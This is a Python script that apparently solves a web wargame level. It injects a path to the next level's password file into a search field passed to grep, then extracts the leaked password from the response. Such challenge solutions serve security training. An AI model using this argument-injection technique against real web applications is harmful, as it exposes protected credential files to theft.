#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials, folder

level_url = credentials[10]["url"]
level_username = credentials[10]["level"]
level_password = credentials[10]["password"]

next_level_url = credentials[11]["url"]
next_level_username = credentials[11]["level"]
next_level_pass = folder + next_level_username

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for letter in alphabet:
    payload =  " ".join((letter, next_level_pass))

    post_data = {"needle": payload, "submit":"Search"}
    response = requests.post(level_url, headers=heads, data=post_data)

    data = response.text
    strings = re.split('\n|:|\s|<|>|/', data)

    if next_level_username in strings:
        next_password = strings[strings.index(next_level_username) + 1]
        print(next_password)
        break
